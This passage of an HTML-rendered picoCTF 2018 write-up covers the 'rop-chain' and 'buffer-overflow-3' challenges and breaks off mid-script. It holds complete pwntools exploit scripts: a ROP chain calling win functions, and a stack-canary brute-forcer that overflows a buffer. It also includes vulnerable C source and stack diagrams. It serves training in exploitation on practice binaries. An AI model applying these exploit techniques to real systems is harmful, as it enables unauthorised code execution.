rop_chain<span style="color:#ff79c6">.</span>flag(<span style="color:#bd93f9">0xDEADBAAD</span>)
<span style="color:#8be9fd;font-style:italic">print</span> rop_chain<span style="color:#ff79c6">.</span>dump()

<span style="color:#bd93f9">0x0000</span>:        <span style="color:#bd93f9">0x80485cb</span> win_function1()
<span style="color:#bd93f9">0x0004</span>:        <span style="color:#bd93f9">0x80485d8</span> win_function2(<span style="color:#bd93f9">0xbaaaaaad</span>)
<span style="color:#bd93f9">0x0008</span>:        <span style="color:#bd93f9">0x804840d</span> <span style="color:#ff79c6">&lt;</span>adjust <span style="color:#ff79c6">@</span><span style="color:#bd93f9">0x10</span><span style="color:#ff79c6">&gt;</span> pop ebx; ret
<span style="color:#bd93f9">0x000c</span>:       <span style="color:#bd93f9">0xbaaaaaad</span> arg0
<span style="color:#bd93f9">0x0010</span>:        <span style="color:#bd93f9">0x804862b</span> flag(<span style="color:#bd93f9">0xdeadbaad</span>)
<span style="color:#bd93f9">0x0014</span>:           <span style="color:#f1fa8c">&#39;faaa&#39;</span> <span style="color:#ff79c6">&lt;</span><span style="color:#ff79c6">return</span> address<span style="color:#ff79c6">&gt;</span>
<span style="color:#bd93f9">0x0018</span>:       <span style="color:#bd93f9">0xdeadbaad</span> arg0
</code></pre></td></tr></table>
</div>
</div><p>Full exploit:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>

<span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
<span style="color:#ff79c6">import</span> os

DEV <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>

remote_path <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;/problems/rop-chain_1_c44c8bc090f78e799c93b77228891dea/&#39;</span>
local_path <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;./&#39;</span>
exe <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;rop&#39;</span>
ssh_user <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;0xade1&#39;</span>
ssh_server <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;2018shell.picoctf.com&#39;</span>

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_process</span>(DEV<span style="color:#ff79c6">=</span>DEV):
    <span style="color:#ff79c6">if</span> DEV:
        path <span style="color:#ff79c6">=</span> os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>join(local_path, exe)
        s<span style="color:#ff79c6">=</span> process(path)
    <span style="color:#ff79c6">else</span>:
        path <span style="color:#ff79c6">=</span> os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>join(remote_path,exe)
        params <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#34;argv&#34;</span>: path, <span style="color:#f1fa8c">&#34;cwd&#34;</span>: os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>dirname(path)}
        s_ <span style="color:#ff79c6">=</span> ssh(host<span style="color:#ff79c6">=</span>ssh_server, user<span style="color:#ff79c6">=</span>ssh_user)
        s <span style="color:#ff79c6">=</span> s_<span style="color:#ff79c6">.</span>process(<span style="color:#ff79c6">**</span>params)
    <span style="color:#ff79c6">return</span> s

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_offset_manually</span>():
    <span style="color:#6272a4">#python -c &#39;import pwn; print(cyclic(128))&#39; | ./rop</span>
    <span style="color:#6272a4">#dmesg | tail -1</span>
    <span style="color:#6272a4">#[160006.966116] rop[17406]: segfault at 61616168 ip 0000000061616168 [...]</span>
    <span style="color:#6272a4">#eip=&#39;haaa&#39;  (0x61616168)</span>
    <span style="color:#ff79c6">return</span> cyclic_find(<span style="color:#f1fa8c">&#39;haaa&#39;</span>)

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_offset_automatically</span>():
    proc <span style="color:#ff79c6">=</span> get_process(<span style="color:#bd93f9">1</span>)
    proc<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;Enter your input&gt; &#34;</span>, cyclic(<span style="color:#bd93f9">200</span>))
    proc<span style="color:#ff79c6">.</span>wait()
    core <span style="color:#ff79c6">=</span> proc<span style="color:#ff79c6">.</span>corefile
    offset <span style="color:#ff79c6">=</span> cyclic_find(core<span style="color:#ff79c6">.</span>eip)
    log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#34;Overflow offset: </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(offset))
    <span style="color:#ff79c6">return</span> offset

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">rop_chain</span>():
    elf <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#39;./rop&#39;</span>)
    rop_chain <span style="color:#ff79c6">=</span> ROP(elf)
    rop_chain<span style="color:#ff79c6">.</span>win_function1()
    rop_chain<span style="color:#ff79c6">.</span>win_function2(<span style="color:#bd93f9">0xBAAAAAAD</span>)
    rop_chain<span style="color:#ff79c6">.</span>flag(<span style="color:#bd93f9">0xDEADBAAD</span>)
    <span style="color:#8be9fd;font-style:italic">print</span> rop_chain<span style="color:#ff79c6">.</span>dump()
    <span style="color:#ff79c6">return</span> rop_chain

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">rop_chain2</span>():
    elf <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#39;./rop&#39;</span>)
    payload <span style="color:#ff79c6">=</span> p32(elf<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;win_function1&#39;</span>])
    payload <span style="color:#ff79c6">+=</span> p32(elf<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;win_function2&#39;</span>])
    payload <span style="color:#ff79c6">+=</span> p32(<span style="color:#bd93f9">0x804840d</span>)   <span style="color:#6272a4">#address of pop ebx; ret</span>
    payload <span style="color:#ff79c6">+=</span> p32(<span style="color:#bd93f9">0xBAAAAAAD</span>)
    payload <span style="color:#ff79c6">+=</span> p32(elf<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;flag&#39;</span>])
    payload <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#39;JUNK&#39;</span>
    payload <span style="color:#ff79c6">+=</span> p32(<span style="color:#bd93f9">0xDEADBAAD</span>)
    <span style="color:#ff79c6">return</span> payload


rop_chain <span style="color:#ff79c6">=</span> rop_chain2()

offset <span style="color:#ff79c6">=</span> get_offset_manually()
payload <span style="color:#ff79c6">=</span> fit({offset: <span style="color:#8be9fd;font-style:italic">str</span>(rop_chain)})

s <span style="color:#ff79c6">=</span> get_process()
s<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;Enter your input&gt; &#34;</span>, payload)

<span style="color:#8be9fd;font-style:italic">print</span> s<span style="color:#ff79c6">.</span>recvall()
</code></pre></td></tr></table>
</div>
</div><h2 id="buffer-overflow-3">buffer-overflow-3</h2>
<ul>
<li>source: <a href="./resources/buffer-overflow-3/vuln.c">vuln.c</a></li>
<li>binary: <a href="./resources/buffer-overflow-3/vuln">vuln</a></li>
</ul>
<p>A custom stack canary of 4 bytes has been added to this binary.
The canary is not randomly generated as it is stored in a canary.txt file.
Therefore, we can easily bruteforce it.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">#define BUFSIZE 32
</span><span style="color:#ff79c6">#define CANARY_SIZE 4
</span><span style="color:#ff79c6"></span>
<span style="color:#8be9fd">void</span> <span style="color:#50fa7b">vuln</span>(){
   <span style="color:#8be9fd">char</span> canary[CANARY_SIZE];
   <span style="color:#8be9fd">char</span> buf[BUFSIZE];
   <span style="color:#8be9fd">char</span> length[BUFSIZE];
   <span style="color:#8be9fd">int</span> x <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
   [...]
   read(<span style="color:#bd93f9">0</span>,buf,count)	<span style="color:#6272a4">/* Buffer overflow vulnerability HERE */</span>
}
</code></pre></td></tr></table>
</div>
</div><p>The vuln function stack before exploitation should looks like the below:</p>
<pre><code>+---------------+
|  RET TO MAIN	|
+---------------+
|   OLD EBP     |  &lt;-- EBP
+---------------+
|   ????        |
|   ????        |
|   int x = 0	|  &lt;-- EBP - 0xc (obtained with radare2)
+---------------+
|   canary      |  &lt;-- EBP - 0x10
+---------------+
|               |
|   buf[32]     |
|               |  &lt;-- EBP - 0x30
+---------------+
</code></pre>
<p>The vuln function stack during exploitation should looks like the below:</p>
<pre><code>+---------------+
| addr of win()	|
+---------------+
|   'C'*4       |  &lt;-- EBP
+---------------+
|               |
|   'B'*12      |
|               |  &lt;-- EBP - 0xc (obtained with radare2)
+---------------+
|   canary      |  &lt;-- EBP - 0x10
+---------------+
|               |
|   'A'*32      |
|               |  &lt;-- EBP - 0x30
+---------------+
</code></pre>
<p>Full exploit:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">77
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>

<span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
<span style="color:#ff79c6">import</span> os
<span style="color:#ff79c6">from</span> string <span style="color:#ff79c6">import</span> printable

DEV <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
h <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;2018shell.picoctf.com&#39;</span>
REMOTE_PATH <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;/problems/buffer-overflow-3_2_810c6904c19a0e8b0da0f59eade5b0ce/&#39;</span>
LOCAL_PATH <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;.&#39;</span>
PRGM <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;vuln&#39;</span>
user, pw <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;0xade1&#39;</span>, <span style="color:#f1fa8c">&#39;YOUR_PASSWORD_HERE&#39;</span>

context<span style="color:#ff79c6">.</span>log_level <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;Critical&#39;</span>


<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_process</span>():
    <span style="color:#ff79c6">if</span> DEV:
        p <span style="color:#ff79c6">=</span> process(os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>join(LOCAL_PATH, PRGM))
    <span style="color:#ff79c6">else</span>:
        s <span style="color:#ff79c6">=</span> ssh(host <span style="color:#ff79c6">=</span> h, user<span style="color:#ff79c6">=</span>user) <span style="color:#6272a4">#, password=pw)</span>
        s<span style="color:#ff79c6">.</span>set_working_directory(REMOTE_PATH)
        p <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>process(os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>join(<span style="color:#f1fa8c">&#39;.&#39;</span>,PRGM))
    <span style="color:#ff79c6">return</span> p

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">execute</span>(size, payload):
    p <span style="color:#ff79c6">=</span> get_process()
    prompt <span style="color:#ff79c6">=</span> p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;&gt;&#39;</span>)
    <span style="color:#6272a4">#print p</span>
    p<span style="color:#ff79c6">.</span>sendline(size)
    p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;Input&gt;&#39;</span>)
    p<span style="color:#ff79c6">.</span>sendline(payload)
    prompt <span style="color:#ff79c6">=</span> p<span style="color:#ff79c6">.</span>recvall()
    p<span style="color:#ff79c6">.</span>close()
    <span style="color:#ff79c6">return</span> prompt


<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">brute_Force_next_canary_char</span>(index, canary, initial_payload):
    <span style="color:#ff79c6">try</span>:
        payload <span style="color:#ff79c6">=</span> initial_payload <span style="color:#ff79c6">+</span> canary
        <span style="color:#ff79c6">for</span> char <span style="color:#ff79c6">in</span> printable: <span style="color:#6272a4">#range(256)</span>
            <span style="color:#8be9fd;font-style:italic">print</span> <span style="color:#f1fa8c">&#39;step </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">/4 - [</span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">/255] canary=</span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">.</span>format(index<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>, char, canary)
            prompt <span style="color:#ff79c6">=</span> execute(<span style="color:#8be9fd;font-style:italic">str</span>(<span style="color:#8be9fd;font-style:italic">len</span>(payload)<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>), payload <span style="color:#ff79c6">+</span> char)
            <span style="color:#6272a4">#print prompt</span>
            <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#39;***&#39;</span> <span style="color:#ff79c6">in</span> prompt:     <span style="color:#6272a4">#Smashed stack detected</span>
                <span style="color:#ff79c6">continue</span>
            <span style="color:#ff79c6">elif</span> <span style="color:#f1fa8c">&#39;Ok...&#39;</span> <span style="color:#ff79c6">in</span> prompt:
                canary <span style="color:#ff79c6">+=</span> char
                <span style="color:#ff79c6">break</span>
            <span style="color:#ff79c6">else</span>:
                <span style="color:#8be9fd;font-style:italic">print</span> prompt
    <span style="color:#ff79c6">except</span> EOFError:
        <span style="color:#ff79c6">pass</span>
    <span style="color:#ff79c6">return</span> canary


<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">guess_canary</span>(initial_payload, canary):
    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">4</span><span style="color:#ff79c6">-</span><span style="color:#8be9fd;font-style:italic">len</span>(canary)):
